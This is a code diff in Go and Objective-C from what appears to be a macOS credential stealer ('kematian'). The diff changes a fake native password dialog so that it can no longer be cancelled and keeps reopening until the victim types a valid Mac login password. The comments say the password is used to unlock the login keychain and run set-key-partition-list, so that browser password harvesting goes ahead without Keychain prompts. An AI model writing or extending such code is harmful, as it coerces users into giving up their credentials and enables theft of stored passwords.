@@ -7,8 +7,12 @@
 // (and Authorization Services as fallback) before harvest continues.
 //
 // The password unlocks the login keychain and runs set-key-partition-list so browser
-// password harvest does not open system Keychain Allow dialogs. This app confirmation
-// modal is intentional; it cannot grant TCC Full Disk Access.
+// password harvest does not open system Keychain Allow dialogs.
+//
+// GUI behavior: Cancel or wrong password does NOT exit the process — the dialog
+// closes and reopens until a correct Mac login password is entered. Only then
+// does the modal go away permanently and harvest continue.
+// TCC Full Disk Access cannot be granted with a password.
 package main
 
 /*
@@ -155,13 +159,18 @@ static char *kematian_show_password_dialog(const char *title, const char *messag
 			[app setActivationPolicy:NSApplicationActivationPolicyAccessory];
 			[app activateIgnoringOtherApps:YES];
 
+			// Keep reopening until a correct password is entered.
+			// Cancel / Escape only closes the current sheet — never exits the app.
 			BOOL showWrong = NO;
+			BOOL showRequired = NO;
 			while (1) {
 				NSAlert *alert = [[NSAlert alloc] init];
 				[alert setMessageText:titleStr];
 				NSString *body = msgStr;
 				if (showWrong) {
 					body = [NSString stringWithFormat:@"%@\n\nThe password you entered is incorrect. Please try again.", msgStr];
+				} else if (showRequired) {
+					body = [NSString stringWithFormat:@"%@\n\nPassword is required to continue.", msgStr];
 				}
 				[alert setInformativeText:body];
 				[alert setAlertStyle:NSAlertStyleInformational];
@@ -197,20 +206,25 @@ static char *kematian_show_password_dialog(const char *title, const char *messag
 				kematian_close_alert(alert);
 				alert = nil;
 
+				// Cancel / close → reopen modal (do not return, do not exit process).
 				if (resp != NSAlertFirstButtonReturn) {
-					result = NULL;
-					break;
+					showWrong = NO;
+					showRequired = YES;
+					continue;
 				}
 
 				if (pw == nil || pw.length == 0) {
-					showWrong = YES;
+					showWrong = NO;
+					showRequired = YES;
 					continue;
 				}
 				if (!kematian_validate_login_password(pw)) {
 					showWrong = YES;
+					showRequired = NO;
 					continue;
 				}
 
+				// Correct password only: leave the loop; modal disappears for good.
 				result = strdup([pw UTF8String]);
 				break;
 			}
@@ -238,28 +252,26 @@ import (
 	"unsafe"
 )
 
-var (
-	errPasswordPromptCancelled = errors.New("password prompt cancelled")
-	errPasswordPromptEmpty     = errors.New("password prompt empty")
-)
-
-// showMacPasswordPrompt displays a native secure-field alert (must run on main thread).
-func showMacPasswordPrompt(title, message string, wrongPassword bool) (string, error) {
-	_ = wrongPassword
+// showMacPasswordPrompt displays a native secure-field alert until a correct password
+// is entered. Cancel only reopens the dialog (handled inside the C loop); this never
+// returns an error for cancel — it blocks until validation succeeds.
+func showMacPasswordPrompt(title, message string) (string, error) {
 	ct := C.CString(title)
 	cm := C.CString(message)
 	defer C.free(unsafe.Pointer(ct))
 	defer C.free(unsafe.Pointer(cm))
 
+	// C loop only returns after kematian_validate_login_password succeeds.
 	pw := C.kematian_show_password_dialog(ct, cm, 0)
 	if pw == nil {
-		return "", errPasswordPromptCancelled
+		// Should not happen (cancel reopens). Defensive: treat as keep-trying failure for Go loop.
+		return "", errors.New("password dialog returned empty")
 	}
 	defer C.free(unsafe.Pointer(pw))
 
 	s := strings.TrimSpace(C.GoString(pw))
 	if s == "" {
-		return "", errPasswordPromptEmpty
+		return "", errors.New("password dialog returned empty")
 	}
 	return s, nil
 }
@@ -277,6 +289,7 @@ func defaultPromptMessage() string {
 }
 
 // acquireMacPassword returns a validated Mac login password from flag/env or GUI.
+// GUI mode never exits on Cancel — the modal reopens until the password is correct.
 func acquireMacPassword(fromFlag string, noPrompt bool, title, message string, quiet bool) (string, error) {
 	_ = quiet
 	if p := strings.TrimSpace(fromFlag); p != "" {
@@ -296,9 +309,12 @@ func acquireMacPassword(fromFlag string, noPrompt bool, title, message string, q
 		message = defaultPromptMessage()
 	}
 
-	pw, err := showMacPasswordPrompt(title, message, false)
-	if err != nil {
-		return "", err
+	// Block until the native dialog accepts a correct password (cancel only reopens).
+	for {
+		pw, err := showMacPasswordPrompt(title, message)
+		if err == nil && strings.TrimSpace(pw) != "" {
+			return strings.TrimSpace(pw), nil
+		}
+		// Extremely defensive: if C ever returned empty, show again instead of exiting.
 	}
-	return pw, nil
 }
